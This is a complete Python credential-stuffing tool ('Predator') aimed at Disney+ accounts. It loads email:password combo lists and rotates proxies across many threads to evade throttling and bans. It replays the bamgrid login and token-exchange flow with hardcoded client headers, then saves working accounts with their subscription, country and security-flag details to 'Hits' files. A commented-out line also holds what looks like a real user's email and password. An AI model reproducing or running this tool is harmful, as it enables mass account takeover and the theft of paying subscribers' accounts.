import re, threading, requests, string, random, time, os, subprocess
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.util.ssl_.DEFAULT_CIPHERS="TLS_AES_128_GCM_SHA256:TLS_CHACHA20_POLY1305_SHA256:TLS_AES_256_GCM_SHA384:TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256:TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256:TLS_ECDHE_ECDSA_WITH_CHACHA20_POLY1305_SHA256:TLS_ECDHE_RSA_WITH_CHACHA20_POLY1305_SHA256:TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384:TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384:TLS_ECDHE_ECDSA_WITH_AES_256_CBC_SHA:TLS_ECDHE_ECDSA_WITH_AES_128_CBC_SHA:TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA:TLS_ECDHE_RSA_WITH_AES_256_CBC_SHA:TLS_RSA_WITH_AES_128_GCM_SHA256:TLS_RSA_WITH_AES_256_GCM_SHA384:TLS_RSA_WITH_AES_128_CBC_SHA:TLS_RSA_WITH_AES_256_CBC_SHA:TLS_RSA_WITH_3DES_EDE_CBC_SHA:TLS13-CHACHA20-POLY1305-SHA256:TLS13-AES-128-GCM-SHA256:TLS13-AES-256-GCM-SHA384:ECDHE:!COMP:TLS13-AES-256-GCM-SHA384:TLS13-CHACHA20-POLY1305-SHA256:TLS13-AES-128-GCM-SHA256"
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
from random import randint, randrange

#Messages
limit="throttled"
ban="forbidden"
error_pass="idp.error.payload.fields.incorrect"
not_valid="is not a valid email Address at /email"
bad_cred="idp.error.identity.bad-credentials"
#Config
dev=0
def id_generator(size=8, chars=string.ascii_uppercase + string.digits):
    return ''.join(random.choice(chars) for _ in range(size))
    
def clear():
 subprocess.run(["clear", ""])
 #time.sleep(0.1)
 
def logo():
 predator=("""\33[0m\33[33m╔══════════════════════════════════════    
║___  ____ ____ ___  ____ ___ ____ ____ 
║|__] |__/ |___ |  \ |__|  |  |  | |__/ 
║|    |  \ |___ |__/ |  |  |  |__| |  \     
║                                    
╚════════════════════════════════════       
\33[0m\33[0m\33[0m\33[1;7;100m             ⚙️ ❪❪❪  𝔻𝕀𝕊ℕ𝔼𝕐  ❫❫❫ ⚙️          \33[0m\33[1;44m
  ☢️ 🅿🆁🅴🅳🅰🆃🅾🆁 ☢️ Ⓑⓨ [★ Ꭾr໐คrtix ★]           \33[0m\33[0;1m""")
 subprocess.run(["clear", ""])
 print(predator)
    
say=0
fls=""
dir='/sdcard/Combo/'      	
if not os.path.exists(dir):
 os.mkdir(dir)

logo()
for files in os.listdir (dir):
 say=say+1
 fls=fls+"	\33[1;31m"+str(say)+"\33[0m\33[1;32m = \33[0m \33[36m"+files+'\33[36m\n'
print("""
    	\33[1;31m \33[0m\33[1;32mꜱᴇʟᴇᴄᴛ ᴄᴏᴍʙᴏ ꜰɪʟᴇ  \33[36m
    	
    """+fls+"""
        	""")
        	
daznfile=int(input("""\33[36m
ᴏᴘᴛɪᴏɴ = \33[36m\33[36m\33[36m"""))

say=0
for files in os.listdir (dir):
 say+=1
 if say==daznfile:
  file=(dir+files)
  break
users=open(file).readlines()
total=len(users)



while True:
 logo()
 print("""
    	\33[1;31m \33[0m\33[1;32mꜱᴇʟᴇᴄᴛ ɴᴜᴍʙᴇʀ ʙᴏᴛꜱ\33[36m
    	
    	\33[1;31m*\33[0m \33[36m1 - 100 ʀᴇᴄᴏᴍᴍᴇɴᴅᴇᴅ \33[36m
""")
 break_bot=input("""\33[36m
ʙᴏᴛꜱ = \33[36m\33[36m\33[36m""")
 break_bot=int(break_bot)
 if break_bot<=100:
     break        
     
retry=0
hits=0
scans=0
custom=0
def gui():
 while True:
  global scans, hits, retry, guiprox, custom
  if guiprox==0:
   prox="├🔴  Proxy    ↔️  ➤  OFF"
  else:
   prox="├🔵  Proxy    ↔️  ➤  ON"
  gui=("""
╭➤ ☢️ 🅿🆁🅴🅳🅰🆃🅾🆁 ☢️ [★ ᴅɪꜱɴᴇʏ ★]         
├🔘  Total    📊  ➤  """+str(total)+"""
├🔘  Scans    🕵️‍♂️  ➤  """+str(scans)+"""    
├🟡  Retry    🔄  ➤  """+str(retry)+"""    
"""+prox+"""
├🟢  Hits     🔥  ➤  """+str(hits)+"""    
├⚪  Custom   🕶️  ➤  """+str(custom)+"""    
╰⚫  Bots     🤖  ➤  """+str(break_bot)+"""
""")
  logo()
  print(gui)
  time.sleep(0.5)

selectprox=0
def proxy():    
 global selectprox
 dirp='/sdcard/proxy/'
 say=0    
 for files in os.listdir (dirp):
     say+=1
     if str(proxyfile)==str(say):
         pdosya=(dirp+files)            
         break               
 proxyf=open(pdosya).readlines()
    
 proxys=(proxyf[selectprox])
 proxys=proxys.replace("\n","")   
 return proxys

proxymode=0
logo()
print("""
	\33[1;31m \33[0m\33[1;32mᴜꜱᴇ ᴘʀᴏxʏꜱ?\33[36m
    	
	\33[1;31m1 \33[0m\33[1;32m= \33[0m \33[36mYes  \33[36m    
	\33[1;31m2 \33[0m\33[1;32m= \33[0m \33[36mNo \33[36m

""")
proxymode=input("""\33[36m
ᴏᴘᴛɪᴏɴ = \33[36m\33[36m\33[36m""")
proxymode=int(proxymode)

typep=0
if proxymode==1:
 logo()
 dirp='/sdcard/proxy/' 
 say=0
 fls=""
 for files in os.listdir (dirp):
  say=say+1
  fls=fls+"	\33[1;31m"+str(say)+"\33[0m\33[1;32m = \33[0m \33[36m"+files+'\33[36m\n'
 print ("""
    	\33[1;31m \33[0m\33[1;32mꜱᴇʟᴇᴄᴛ ᴄᴏᴍʙᴏ ꜰɪʟᴇ  \33[36m
    	
    """+fls+"""
        	""")
 proxyfile=int(input("""\33[36m
ᴏᴘᴛɪᴏɴ = \33[36m\33[36m\33[36m"""))
 say=0
 for files in os.listdir (dirp):
  say+=1
  if say==proxyfile:
   file=(dirp+files)
   break
 proxyf=open(file).readlines()

 
 logo() 
 typep="""
	\33[1;31m \33[0m\33[1;32mꜱᴇʟᴇᴄᴛ ᴘʀᴏxʏ ᴛʏᴘᴇ  \33[36m
        	
	\33[1;31m1 \33[0m\33[1;32m= \33[0m \33[36mʜᴛᴛᴘ  \33[36m    
	\33[1;31m2 \33[0m\33[1;32m= \33[0m \33[36mꜱᴏᴄᴋ4 \33[36m
	\33[1;31m3 \33[0m\33[1;32m= \33[0m \33[36mꜱᴏᴄᴋ5 \33[36m
        
        
    \33[36m
ᴏᴘᴛɪᴏɴ = \33[36m\33[36m\33[36m"""
 typep=typep+"""\33[0m"""
 typep=int(input(typep))
 
  
  
bot=0
id_bot=0
selectprox=0
def run():
 global custom, guiprox, scans, hits, retry, bot, selectprox
 pattern= "(\w{2}:\w{2})"
 bot+=1
 id_bot=bot
 proxys="OFF"
 if proxymode==2:
  badprox=0
  guiprox=0
 else:
  badprox=1
  guiprox=1
 for predator in range(id_bot, total, break_bot):
  up=re.search(pattern,users[predator],re.IGNORECASE)
  #===== SELECT USERS ========
  if up:
   predatorr = users[predator].split(":")    			 
   try:
    user=str(predatorr[0].replace(" ",""))
   except:
    user='user'    			 
   try:
    pas=str(predatorr[1].replace(" ",""))
    pas=str(pas.replace('\n',""))
   except:
    pas='12345' 
  #================================   
  	 
  while True:
  # user="isabelmape@hotmail.com"
  # pas="2024caja"
   #=====[ PROXY SELECT ]======= 
   if badprox == 1:  	
    if typep == 1 or typep == 2 or typep==3:      
     dirp='/sdcard/proxy/'
     say=0    
     for files in os.listdir (dirp):
      say+=1
      if str(proxyfile)==str(say):
        pdosya=(dirp+files)            
        break               
     proxyf=open(pdosya).readlines()  
    try: 
     proxylen=len(proxyf)
     proxyr=randint(1,proxylen)
     proxys=(proxyf[proxyr])
     proxys=proxys.replace("\n","")
     proxys=proxys.replace("<br />","")
     proxys=proxys.replace("<br/>","")
     badprox=0
    except:pass
   #================================== 
   if typep==1:
    #proxys=proxy()
    proxies = {
   'http': proxys ,
   'https': proxys ,
    }
   if typep==2:
    #proxys=proxy()
    proxies = {
   'http': 'socks4://'+proxys ,
   'https': 'socks4://'+proxys ,
    }   	 
   if typep==3:
    #proxys=proxy()
    proxies = {
   'http': 'socks5://'+proxys ,
   'https': 'socks5://'+proxys ,
    }   	            	   	   	   	
   	#============================
   if dev==1:
    print("""
["""+str(id_bot)+"""] """+user+""":"""+pas+""" 
[Proxy] """+proxys+"""    

""")     
    time.sleep(2) 

#======[ CHECKER ]==========
   
   data={
   	"deviceFamily":"application",
   	"applicationRuntime":"iPhone7,2",
   	"deviceProfile":"iPhone7,2",
   	"attributes":{}
   	}
   
   
   headers={
   "Host":"global.edge.bamgrid.com",
   "X-BAMSDK-Platform":"iPhone7,2",
   "Accept":"application/json",
   "X-BAMSDK-Client-ID":"disney-svod-3d9324fc",
   "Authorization":"Bearer ZGlzbmV5JmFwcGxlJjEuMC4w.H9L7eJvc2oPYwDgmkoar6HzhBJRuUUzt_PcaC3utBI4",
   "X-BAMSDK-Transaction-ID":"38352459-B3B6-4B40-BEA5-DF106B4A4020",
   "Accept-Language":"en-us",
   "Accept-Encoding":"gzip,deflate",
   "X-BAMSDK-Version":"9.9.2",
   "X-DSS-Edge-Accept":"vnd.dss.edge+json;version=1",
   "Content-Length":"1019",
   "User-Agent":"Disney+/23962CFNetwork/978.0.7Darwin/18.7.0",
   "Connection":"close"
   }
   	
   headers2={
   	"Content-Type":"application/x-www-form-urlencoded",
   "Host":"global.edge.bamgrid.com",
   "X-BAMSDK-Platform":"iPhone7,2",
   "Accept":"application/json",
   "X-BAMSDK-Client-ID":"disney-svod-3d9324fc",
   "Authorization":"Bearer ZGlzbmV5JmFwcGxlJjEuMC4w.H9L7eJvc2oPYwDgmkoar6HzhBJRuUUzt_PcaC3utBI4",
   "X-BAMSDK-Transaction-ID":"38352459-B3B6-4B40-BEA5-DF106B4A4020",
   "Accept-Language":"en-us",
   "Accept-Encoding":"gzip,deflate",
   "X-BAMSDK-Version":"9.9.2",
   "X-DSS-Edge-Accept":"vnd.dss.edge+json;version=1",
   "Content-Length":"1019",
   "User-Agent":"Disney+/23962CFNetwork/978.0.7Darwin/18.7.0",
   "Connection":"close"
   }
   
   try:
    login={
    "email":user,
    "password":pas
    }
   except:
    login=""
   token=""
   if proxymode==2:
    
    token=requests.post('https://global.edge.bamgrid.com/devices', json=data, headers=headers, verify=False, timeout=5).text    
    try:
     token=token.split('assertion":"')[1]
     token=token.split('"}')[0]
     ok=1
    except:pass         
    if dev==1:
     print(token)
   else:
    try:
     token=requests.post('https://global.edge.bamgrid.com/devices', json=data, headers=headers, verify=False, timeout=5, proxies=proxies).text      
     if dev==1:
      print(token)
     token=token.split('assertion":"')[1]
     token=token.split('"}')[0]            
     ok=1
     if dev==1:
      print(token)
    except Exception as e:
     ok=0
     if dev==1:
      print(e)
     retry+=1
     token="bad"     
     badprox = 1
     

   if limit in token:
    retry+=1
    ok=0
    if proxymode==1:
     badprox=1     
   if token=="bad":
    ok=0
    retry+=1
    if proxymode==1:
     badprox=1
   if ban in token:
    ok=0
    retry+=1
    if proxymode==1:
     badprox=1  
 #================= access_token   
   if ok==1:
    access_token=""
    data2="platform=iphone&grant_type=urn:ietf:params:oauth:grant-type:token-exchange&subject_token="+token+"&subject_token_type=urn:bamtech:params:oauth:token-type:device"
    if proxymode==2:   
       
     access_token=requests.post('https://global.edge.bamgrid.com/token', verify=False, data=data2, headers=headers2, timeout=5).text          
     try:
      access_token=access_token.split('access_token":"')[1]
      access_token=access_token.split('"')[0]
      ok=1
     except:pass
     if dev==1:
      print(access_token)
    else:
     try:
      access_token=requests.post('https://global.edge.bamgrid.com/token', verify=False, data=data2, headers=headers2, timeout=5, proxies=proxies).text 
      try:
       access_token=access_token.split('access_token":"')[1]
       access_token=access_token.split('"')[0]
       ok=1
      except:pass
      if dev==1:
       print(access_token)
     except Exception as e:
      if dev==1:
       print(e)
      retry+=1
      access_token="bad"     
      badprox = 1
     
    if limit in access_token:
     retry+=1
     ok=0
     if proxymode==1:
      badprox=1     
    if access_token=="bad":
     ok=0
     retry+=1
     if proxymode==1:
      badprox=1
    if ban in access_token:
     ok=0
     retry+=1
     if proxymode==1:
      badprox=1  
      
    headers3={
    "Host":"global.edge.bamgrid.com",
    "X-BAMSDK-Platform":"iPhone7,2",
    "Accept":"application/json;charset=utf-8",
    "X-BAMSDK-Client-ID":"disney-svod-3d9324fc",
    "Authorization":"Bearer "+access_token,
    "X-BAMSDK-Transaction-ID":"B60EB6F9-C59D-4037-827A-6D1E9B707F69",
    "Accept-Language":"en-us",
    "Accept-Encoding":"br,gzip,deflate",
    "X-BAMSDK-Version":"9.9.2",
    "X-DSS-Edge-Accept":"vnd.dss.edge+json;version=1",
    "Content-Length":"67",
    "User-Agent":"Disney+/23962CFNetwork/978.0.7Darwin/18.7.0",
    "Connection":"keep-alive"
    }  
#============== Logged                            
   if ok==1:
    logged=""
    grantt=""
    if proxymode==2:
      
      logged=requests.post('https://global.edge.bamgrid.com/idp/login', verify=False, json=login, headers=headers3, timeout=5).text                                                                                           
      try:
       logged=logged.split('"id_token":"')[1]
       logged=logged.split('"')[0] 
       ok=1
       grantt={
       "id_token":""+logged
       }          
      except:pass 
      if dev==1:
       print(logged)                        
    else:
     try:
      logged=requests.post('https://global.edge.bamgrid.com/idp/login', verify=False, json=login, headers=headers3, timeout=5, proxies=proxies).text                                                                                                 
      try:
       logged=logged.split('"id_token":"')[1]
       logged=logged.split('"')[0]  
       ok=1
       grantt={
       "id_token":""+logged
       }  
      except:pass 
      if dev==1:
       print(logged)
     except Exception as e:
      if dev==1:
       print(e)
      retry+=1
      logged="bad"     
      badprox = 1
      
    if limit in logged:
     retry+=1
     ok=0
     if proxymode==1:
      badprox=1     
    if logged=="bad":
     ok=0
     retry+=1
     if proxymode==1:
      badprox=1
    if ban in logged:
     ok=0
     retry+=1
     if proxymode==1:
      badprox=1 
    if error_pass in logged:
     scans+=1
     ok=0
     break
    if not_valid in logged:
     scans+=1
     ok=0
     break
    if bad_cred in logged:
     scans+=1
     ok=0
     break   
#=========== TOKEN 2
   if ok==1:  
    
    token2=""
    data3=""
    if proxymode==2:    
     token2=requests.post('https://global.edge.bamgrid.com/accounts/grant',verify=False,json=grantt,headers=headers3, timeout=5).text
     try:
      token2=token2.split('"assertion":"')[1]
      token2=token2.split('"')[0]
      data3="grant_type=urn:ietf:params:oauth:grant-type:token-exchange&latitude=0&longitude=0&platform=browser&subject_token="+token2+"&subject_token_type=urn:bamtech:params:oauth:token-type:account"
      ok=1
     except:pass
    else:
     try:
      token2=requests.post('https://global.edge.bamgrid.com/accounts/grant',verify=False,json=grantt,headers=headers3, timeout=5).text
      try:
       token2=token2.split('"assertion":"')[1]
       token2=token2.split('"')[0]
       data3="grant_type=urn:ietf:params:oauth:grant-type:token-exchange&latitude=0&longitude=0&platform=browser&subject_token="+token2+"&subject_token_type=urn:bamtech:params:oauth:token-type:account"
       ok=1
      except:pass  
     except Exception as e:
      if dev==1:
       print(e)
      retry+=1
      logged="bad"     
      badprox = 1      
      
    if limit in token2:
     retry+=1
     ok=0
     if proxymode==1:
      badprox=1     
    if token2=="bad":
     ok=0
     retry+=1
     if proxymode==1:
      badprox=1
    if ban in token2:
     ok=0
     retry+=1
     if proxymode==1:
      badprox=1             

#====== ACCESS ACCOUNT
   if ok==1:
    access_account=""
    if proxymode==2:  
     access_account=requests.post('https://global.edge.bamgrid.com/token',data=data3,headers=headers2,verify=False, timeout=5).text
     try:
      access_account=access_account.split('access_token":"')[1]
      access_account=access_account.split('"')[0]
      ok=1
     except:pass
    else:
     try:
      access_account=requests.post('https://global.edge.bamgrid.com/token',data=data3,headers=headers2,verify=False, timeout=5).text
      try:
       access_account=access_account.split('access_token":"')[1]
       access_account=access_account.split('"')[0]
       ok=1  
      except:pass
     except Exception as e:
      if dev==1:
       print(e)
      retry+=1
      logged="bad"     
      badprox = 1
      
    if limit in access_account:
     retry+=1
     ok=0
     if proxymode==1:
      badprox=1     
    if access_account=="bad":
     ok=0
     retry+=1
     if proxymode==1:
      badprox=1
    if ban in access_account:
     ok=0
     retry+=1
     if proxymode==1:
      badprox=1                    
      
           
#====== EXTRACT DATA    

    if ok==1:
     datauser=""
     datauser2=""
     headers5={
    "User-Agent":"Disney+/23962CFNetwork/978.0.7Darwin/18.7.0",
    "Pragma":"no-cache",
    "Accept":"application/json",
    "X-BAMSDK-Platform":"iPhone7,2",
    "X-BAMSDK-Client-ID":"disney-svod-3d9324fc",
    "authorization":"Bearer "+access_account,
    "X-BAMSDK-Version":"9.9.2"
     }   
     if proxymode==2:
      datauser=requests.get('https://global.edge.bamgrid.com/accounts/me',headers=headers5, timeout=5).text           
      datauser2=requests.get('https://global.edge.bamgrid.com/subscriptions',headers=headers5,timeout=5).text
      print("""
"""+datauser+"""


"""+datauser2+"""
""")
     else:
      try:
       datauser=requests.get('https://global.edge.bamgrid.com/accounts/me',verify=False,headers=headers5).text 
       datauser2=requests.get('https://global.edge.bamgrid.com/subscriptions',headers=headers5,timeout=5).text
      except:pass
     try:
      securityflag=datauser.split('"securityFlagged":')[1]
      securityflag=securityflag.split(',"')[0]
      emailverify=datauser.split('emailVerified":')[1]
      emailverify=emailverify.split(',"')[0]
      country=datauser.split('country":"')[1]
      country=country.split('"')[0]
      subcription=datauser2.split('name":"')[1]
      subcription=subcription.split('"')[0]
      lastupdt=datauser2.split('lastUpdateDate":"')[1]
      lastupdt=lastupdt.split('"')[0]
      lastupdt=lastupdt[:10]
      lastcnx=datauser2.split('lastSyncDate":"')[1]
      lastcnx=lastcnx.split('"')[0]
      lastcnx=lastcnx[:10]
      typesub=datauser2.split('"type":"')[1]
      typesub=datauser2.split('"')[0]
      
      disney="""
╭──➤ ☢️ 🅿🆁🅴🅳🅰🆃🅾🆁 ☢️
╰────[ 𝓑𝔂 Ꭾr໐คrtix ] [ᴅɪꜱɴᴇʏ]
            
╭──➤ ❪❪ 🔌 🅂🄸🄶🄽 🄸🄽 🔌 ❫❫
├❪🔘❫ 👩‍ User ➤ """+user+"""
├❪🔘❫ 🔑 Pass ➤ """+pas+"""
╰────────⧳
            
╭──➤ ℹ️ 🄸🄽🄵🄾 ℹ️
├❪🔘❫ 🪙 Subcription ➤ """+subcription+"""
├❪🔘❫ 📆 Country     ➤ """+country+""" 
├❪🔘❫ 👩 Last Conx   ➤ """+lastcnx+"""
├❪🔘❫ ✅ Verified    ➤ """+emailverify+"""
├❪🔘❫ 🔑 security flagged ➤ """+securityflag+"""
╰────────⧳
            """  
      if dev==1:
       print(disney)
      if typesub=="SUBSCRIBED":                                      
       whitedisney=open('/sdcard/Hits/Predator_Disney.txt','a+') 
       whitedisney.write(disney) 
       whitedisney.close()
       hits+=1
      else:
       whitedisney=open('/sdcard/Hits/Predator_Disney[Custom].txt','a+') 
       whitedisney.write(disney) 
       whitedisney.close()           
       custom+=1
      scans+=1      
      break            
     except:break  

#============================  

run_bot=0
while True:
 startrun = threading.Thread(target=run)
 startrun.start()
 run_bot+=1
 #time.sleep(1)
 if run_bot==break_bot:
     break


if dev==1:
 time.sleep(0.1)
else:
 startgui = threading.Thread(target=gui)
 startgui.start()
